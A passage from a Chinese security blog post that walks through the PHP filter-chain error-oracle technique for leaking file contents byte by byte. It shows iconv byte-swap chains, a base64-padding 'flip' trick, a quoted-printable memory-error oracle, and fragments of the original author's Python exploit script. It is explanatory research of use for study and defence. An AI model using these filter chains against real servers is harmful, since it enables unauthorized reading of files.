</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.CSUNICODE.UCS-2BE/resource=data:,abcdefgh&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=s2>&#34;badcfehg&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.CSUNICODE.UCS-2BE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=s2>&#34;cdabghef&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>但是对于后半部分 fehg ，似乎永远在最后，我们好像没有办法通过 r2/r4 的组合使其放到前半部分，这时我们只能再利用一些其他技巧了。这里需要一些 base64 filter 的前置知识，可以回顾一下：<a class=link href=https://tttang.com/archive/1395/#toc_php-base64-filter target=_blank rel=noopener>https://tttang.com/archive/1395/#toc_php-base64-filter</a> （没想到这里串起来了！</p><p>利用 PHP 在处理 Base64 字符串的时会完全忽略非法字符的特性，我们首先添加几个非法字符在字符串的最前端，比如使用 convert.iconv.CSUNICODE.CSUNICODE 编码可以在字符串最前端加上 0xff0xfe ，使用一些交换技巧并利用 base64decode 再次把非法冗余位剔除，就可以完成后续字符换到前端来的操作了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>// 产生填充字符
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdef&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=s2>&#34;��abcdef&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 使用 r4 进行移位
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=s2>&#34;ba��fedc&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 使用 base64 去掉冗余位
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdef&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=s2>&#34;bafedQ==&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 再次使用 r4 交换位置
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=s2>&#34;efab==Qd&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>通过如上的形式变换，我们就可以把原来后半部分的字符移位到前半部分来了。</p><p>细心的同学可能会注意到，我这里并没有使用 abcdefgh 8 字节为例，这是因为 r4 编码对于字节有要求，一定需要 4 字节为一组，而我们再产生 2 字节冗余之后会引起 r4 报错，使得 r4 编码失效，所以这里为了方便举例就没有使用 8 字节。</p><p>但是，这是不是一个问题？是的！所以我们需要一些技巧来弥补这个问题。</p><h3 id=part-21---base64-and-its-two-equal-signs>Part 2.1 - Base64 and its two equal signs</h3><p>我们回顾一下上述过程，我们应用 r4 变换在两个地方，一个是产生填充字符之后，我们用 (1) 来做标记，另外一个是使用 base64 消除冗余字符之后，我们用 (2) 做标记。</p><p>对于 (1) ，其实还是相对比较好解决，对于要移位的字符串，我们尽可能让其长度满足 4*n - 2 即可，这里我们或许可以通过填充字符来实现，但是比较要命的是，我们不知道我们需要 Leak 字符串的原本长度是多少。</p><p>好在 Base64 编码的结果长度都是 4*n 字节，但是我们仍然需要另外两个字节，这里我们就不得不感谢 Base64 的填充位了。</p><p>在 Base64 编码中，分组编码完成后，不足分组编码的最后会使用 = 进行填充，我们是不是可以利用这两个等号进行一定的变换操作，使得在其他字节不变动的情况下满足我们 4*n-2 的长度条件？</p><p>于是作者找到了这个 filter :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7/resource=data:,==&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>24</span><span class=p>)</span> <span class=s2>&#34;+---AD0-3D3D+---AD0-3D3D&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>这个 filter 会固定将两个等号转换成另外一个长度为 24 字节的字符串，所以原本的字符串长度就变为 4*n-2+24 = 4*(n+6) - 2 也是符合了我们上述的长度要求！</p><p>我们以 abcdefghij== 为例：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>// 将等号进行转换
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7/resource=data:,abcdefghij==&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>34</span><span class=p>)</span> <span class=s2>&#34;abcdefghij+---AD0-3D3D+---AD0-3D3D&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 在前端添加冗余字符串
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdefghij==&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>36</span><span class=p>)</span> <span class=s2>&#34;��abcdefghij+---AD0-3D3D+---AD0-3D3D&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 使用 r4
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefghij==&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>36</span><span class=p>)</span> <span class=s2>&#34;ba��fedcjihg---+-0DAD3D3---+-0DAD3D3&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 去除冗余
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdefghij==&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>28</span><span class=p>)</span> <span class=s2>&#34;bafedcjihg+0DAD3D3+0DAD3Dw==&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>在这里，为了方便后续描述，我们先与作者脚本里面的一样，定义上述流程为一个 flip 操作，也就是说一个 flip 流程包括等号转换、添加冗余、r4 转换、去除冗余这几个步骤。</p><p>根据一个 flip 操作，在解决 (1) 之后，我们在 (2) 之前得到的字符串为 <code>bafedcjihg+0DAD3D3+0DAD3Dw==</code> ，其长度为 28 ！也正好满足 r4 的长度要求，所以再使用一次 r4 变换即可把 fe 字符都换到最前面来了</p><h3 id=part-22---access-all-positions>Part 2.2 - Access All Positions</h3><p>到目前为止，我们基本上解决了 8 字节中的 1-6 位置的获取，至于其他位置呢？</p><p>例如 7-8 位置，我们可以通过首先进行一次 r4 操作，使得 hg 移动到原来 ef 的位置，再重复上述流程即可，这里就不再赘述，感兴趣的同学可以自行尝试。</p><p>那么超过 8 字节的位置呢？（其实我觉得这里熟悉算法的同学可能就会了，但是我当时确实还不会，所以也给像我一样比较菜的同学解释一下）</p><p>我们观察如上的操作，从我们引入了冗余字节，到最后又剔除掉冗余字节，实际上我们每次在进行这个操作后，后续的字节都会向前移动，所以实际上我们进行上述的 flip 次数越多，我们就拿到距离开头越远的字符。</p><p>举个例子，我们可以通过如下步骤获取到第 9 位（下表序号为 8 ）的字符：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>abcd efgh ijkl mnop -&gt;flip-&gt; 
</span></span><span class=line><span class=cl>bafe dcji hg+0 DAD3 -&gt;r4-&gt;
</span></span><span class=line><span class=cl>efab ijcd 0+gh -&gt;flip-&gt;
</span></span><span class=line><span class=cl>feji ba+0 dcD3 -&gt;r4-&gt;
</span></span><span class=line><span class=cl>ijef 0+ab 3Dcd
</span></span></code></pre></td></tr></table></div></div><p>我们可以观察得到规律，以 ij 两个字符为例，每次使用一次 flip/r4 操作都会使得这两字符前进 4 个字节位置，对于原本在第 9/10 位的 ij 来说，第一次 flip/r4 后到了 5/6 位，第二次则到了 1/2 位。</p><p>所以我们可以根据这个规律，对于下标为 n 的字符，只需要进行 n//4 次 flip/r4 组合就能将其位移到字符串的前端，最后前后可以使用 r4/r2 进行微调就行，微调细节可以看我们之前第一个例子为例。</p><p>所以最后这个简单的算法实现可以参考作者的脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_nth</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=k>global</span> <span class=n>flip</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r4</span>
</span></span><span class=line><span class=cl>	<span class=n>o</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>	<span class=n>chunk</span> <span class=o>=</span> <span class=n>n</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=n>chunk</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span> <span class=n>o</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>r4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>o</span><span class=o>.</span><span class=n>extend</span><span class=p>([</span><span class=n>flip</span><span class=p>,</span> <span class=n>r4</span><span class=p>]</span> <span class=o>*</span> <span class=p>(</span><span class=n>chunk</span> <span class=o>//</span> <span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>n</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>chunk</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>1</span><span class=p>):</span> <span class=n>o</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>r2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>join</span><span class=p>(</span><span class=o>*</span><span class=n>o</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=part-23---the-oracle-of-base64>Part 2.3 - The Oracle of Base64</h3><p>然而以上一切的理论都基于一个条件，那就是一个拥有两个等号的 Base64 字符串，如果我们将文件内容进行 Base64 编码后得到的 Base64 并没有两个等号的话，以上都不再成立了。</p><p>所以我们的目标又回到了如何不依赖文件内容、同时也不能过度修改文件内容的情况下产生一个满足要求的 Base64 字符串。</p><p>听起来可能有点绕，为什么说我们不依赖文件内容呢？因为这里我们并不知道文件内容经过编码后是否得到符合要求的 Base64 ；为什么说我们不能过度修改文件内容呢？因为倘若我们通过尝试增加了一些冗余填充位来使得经过 Base64 编码后的字符串满足要求的话，最后解码结果会因为引进过多的其他要素，而导致影响了解码结果，我们的最终目的还是需要通过这个 Base64 来解码获取原文件内容。</p><p>又或者说，我们有没有什么办法检测原文件内容经过 Base64 编码后是否拥有两个 = ？看起来我们又回到了等号的编码问题上。</p><p>目前我们拥有能够判断服务器某些条件的 Oracle 也只有 dechunk ，我们是不是可以利用这个 Oracle 来服务其他的判断条件呢？比如此处的等号，因为对于此时要求的 Base64 编码，其他都是数字字母，只有最后比较特殊的等号需要我们判断，那么有没有一种编码格式可以对数字字母都无效，但是可以把等号变成其他更长字节长度的字符，使得长度过长从而导致服务器产生内存错误呢？</p><p>于是我们大概的想法是，如果该 Base64 编码存在等号，经过某个编码使得等号长度不断扩大最终导致服务器内存错误；如果不存在等号，经过某个编码就不会导致服务器内存错误。</p><p>最后作者找到了这么一个编码：convert.quoted-printable-encode 。它会将一个 = 编码成 =3D ，从原来的 1 个字节变成了 3 个字节，而且对其他数字字母并不会生效，完美符合我们的要求。</p><p>所以我们现在的做法就是：</p><ol><li>获取 Part 1 中 n 组 convert.iconv.L1.UCS-4LE 组合会致使服务器产生内存错误的临界值 n</li><li>使用 convert.base64-encode|convert.base64-encode 两次 Base64 编码对文件内容进行编码</li><li>使用大量的 convert.quoted-printable-encode 编码对上一步 Base64 结果中的等号进行数次编码</li><li>最后拼接上 n-1 组 convert.iconv.L1.UCS-4LE 组合</li></ol><p>按照如上步骤，如果我们通过文件内容得到的 Base64 编码中含有两个等号，则会因为后续通过大量的 convert.quoted-printable-encode 编码扩展，拼接上原本不会让服务器产生内存错误的 n-1 组 convert.iconv.L1.UCS-4LE ，致使服务器产生了内存错误；如果没有等号，即使经过 大量的 convert.quoted-printable-encode 编码扩展也不会扩展字节，拼接上 n-1 组 convert.iconv.L1.UCS-4LE 也不会产生内存错误。</p><p>所以此时，我们就有了判断文件内容经过两次 Bae64 之后是否有等号的 Oracle 了，但是这仅仅只是判断有等号，这种情况还包括了 1 或者 2 个等号，况且，我们最终的目的还是需要获得拥有两个 = 的 Base64 编码，仅仅只是能判断有没有等号还是不行。</p><h3 id=part-24---how-to-get-the-specific-base64>Part 2.4 - How to get the specific base64</h3><p>我们稍微再仔细回顾一下 Base64 的<a class=link href=https://en.wikipedia.org/wiki/Base64#Examples target=_blank rel=noopener>编码规则</a>，等号是由于 Base64 编码填充形成的，对于等号填充形式，基本上我们有三种状态：1 个等号、2 个等号、没有等号。而其实这几种状态又是可以相互转移的，我们分别考虑：</p><ol><li>在没有等号的情况下，字符串长度 n ，总 bit 长度为 8*n 恰好为 Base64 分组 6 的倍数，此时如果我们再添加 2+3*k (k>=0) 个字节即可获得 1 个等号的填充；或者再添加 1+3*k (k>=0) 个字节即可获得 2 个等号的填充</li><li>在有 1 个等号的情况下，字符串长度 n ，总 bit 长度为 8*n = 6*(n+2) - 8 = 6*n +4 ，此时如果我们再添加 2+3*k (k>=0) 个字节即可获得 2 个等号的填充；或者再添加 1+3*k (k>=0) 个字节得到没有等号填充的状态</li><li>在有 2 个等号的情况下，我们不需要额外填充</li></ol><p>我们仔细想想，因为我们从上述的 Oracle 无法判断原来的内容编码后有多少个等号，但是我们可以通过判断出没有等号的情况，那么我们是不是可以通过没有等号的情况，将其转移成固定有两个等号的情况呢？所以我们接下来我们需要找到一个可以产生 1+3*k 或者 2+3*k 字节的编码形式。</p><p>我觉得这里选择就比较多了，作者这里选择的是可以在头部添加固定字符 <code>\x1b$)C</code> 的编码 convert.iconv..CSISO2022KR ，我们只需要使用这个编码即可改变最终 Base64 的结果，并且这个编码产生的是固定字符，最终解码的时候我们也可以比较方便地识别并去掉这个 4 个字节的字符。</p><p>状态转移的问题算是解决了，可是我们得到的 Base64 编码字符串不一定都是无等号的吧？万一正好有 2 个等号呢？</p><p>这时就又回到我们状态转移的问题上来了，虽然我们无法判断有几个等号，但是我们可以判断没有等号的情况，而我们知道通过之前的 Oracle ，只有没有等号的情况是无法产生报错的，而这几种状态是可以相互转移的。</p><p>所以！我们只要覆盖这三种状态，判断出哪一种是没有等号的状态，再对其进行状态转移即可：</p><ol><li>首先通过对原内容进行编码的为状态 1 ：convert.base64-encode|convert.base64-encode</li><li>通过增加了 1 次 4 字节冗余编码的为状态 2 ：convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode</li><li>通过增加了 2 次 4 字节冗余编码的为状态 3 ：convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode</li></ol><p>因为根据上文对 Base64 编码规则的推断，每增加一次 4 字节冗余就能使得编码状态发生相应的转移，所以无论最初的状态 1 是什么，以上三种都能覆盖等号的三种状态。</p><p>然后我们再用之前提到的 Oracle 判断其中没有等号的状态，再将其转移到有 2 个等号的状态，就必定能产生满足我们有 2 个等号的 Base64 编码了！</p><p>这里对应的作者原脚本中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;detecting equals&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>j</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>	<span class=n>req</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;convert.base64-encode|convert.base64-encode|</span><span class=si>{</span><span class=n>blow_up_enc</span><span class=si>}</span><span class=s1>|</span><span class=si>{</span><span class=n>trailer</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>	<span class=n>req</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode</span><span class=si>{</span><span class=n>blow_up_enc</span><span class=si>}</span><span class=s1>|</span><span class=si>{</span><span class=n>trailer</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>	<span class=n>req</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|</span><span class=si>{</span><span class=n>blow_up_enc</span><span class=si>}</span><span class=s1>|</span><span class=si>{</span><span class=n>trailer</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>sum</span><span class=p>(</span><span class=n>j</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>j</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=kc>False</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>header</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#39;</span>
</span></span><span class=line><span class=cl><span class=k>elif</span> <span class=n>j</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=kc>False</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>header</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode&#39;</span>
</span></span><span class=line><span class=cl><span class=k>elif</span> <span class=n>j</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=kc>False</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>header</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;convert.base64-encode|convert.base64-encode&#39;</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;j: </span><span class=si>{</span><span class=n>j</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;header: </span><span class=si>{</span><span class=n>header</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=part-3---translation>Part 3 - Translation</h3><p>看起来我们解决了一系列的问题，我们回顾一下我们之前解决了哪些问题：</p><ol><li>必定产生一个带有 2 个等号的 Base64 字符串</li><li>可以让字符串中任一字节移动到首位</li><li>可以利用 dechunk 判断字符串首位是否在 a-fA-F0-9 范围内</li></ol><p>可以看到，拥有了以上条件，我们能做的还仅仅只是判断字符是否在一个大概范围内，这显然无法满足我们解题的要求，我们接下来要做的就是设法准确判断第一个字节。</p><p>其实经过上文 filter 的洗礼，可能有同学已经有自己的想法了：是否存在这么一些 filter ，可以单独对每个字母生效将其转换到 a-fA-F0-9 的范围内呢？</p><p>举个例子，比如假设有这么一个 1to1 的 filter ，它只对 z 字母有效，可以把 z 转换到 a 字符，对其他字母都不生效；这样一来，如果第一个字母是 z 的话，我们就可以利用这个 filter 将其转换到 a ，再利用最初的 Orcale 进行判断了，此时就不会产生内存错误；而如果不是 z 的话，就不会被转换，仍然产生内存错误。</p><p>所以基于以上思路，虽然找到这样的 filter 确实很难，因为毕竟都是要满足 26*2 + 10 个要求&mldr;几乎不太可能，但是我们可以退而求其次，我们首先判断出一些字母，这些字母集合为 A ，其他另外某几个字母集合 B ，倘若有这么一个 filter 可以判断 A ∪ B ，但是因为集合 A 已经被我们排除了，所以这个 filter 尽管没有很满足我们 1to1 的要求，但是也能协助我们转换 B 集合部分的字母。</p><p>这里先介绍后续会用到的一些 filter 的作用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>rot1</span> <span class=o>=</span> <span class=s1>&#39;convert.iconv.437.CP930&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># 会将字母向后移动一位，所以称呼为 rot1 ，比如 a-&gt;b, b-&gt;c</span>
</span></span><span class=line><span class=cl><span class=c1># 但是只对部分字母有效，初步测试为 a-h 范围，不包括数字，其他字母会有其他规则 i-&gt;q ，后续就不是 rot1 了</span>
</span></span><span class=line><span class=cl><span class=n>rot13</span> <span class=o>=</span> <span class=s1>&#39;string.rot13&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># rot13 算法，向后移动 13 位</span>
</span></span><span class=line><span class=cl><span class=n>tolower</span> <span class=o>=</span> <span class=s1>&#39;string.tolower&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># 将大写字母转换成小写</span>
</span></span></code></pre></td></tr></table></div></div><p>因为有 string.tolower 的存在，所以我们后续分析小写字母，大写字母只需要通过该 filter 转换成小写字母即可，后文就不再赘述。</p><h3 id=part-31---a-f>Part 3.1 - A-F</h3><p>按照以上逻辑，我们首先把最简单，最容易的排除的字母先解决掉，比如 a-fA-F0-9 这个范围，我们直接可以通过 dechunk 是否产生错误来判断字符是否在这个范围，所以可以首先使用 dechunk 判断这个范围。</p><p>通过 rot1 转换，我们就可以把 f 排除出范围了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.437.CP930|dechunk/resource=data:,a&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.437.CP930|dechunk/resource=data:,e&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=s2>&#34;&#34;</span>
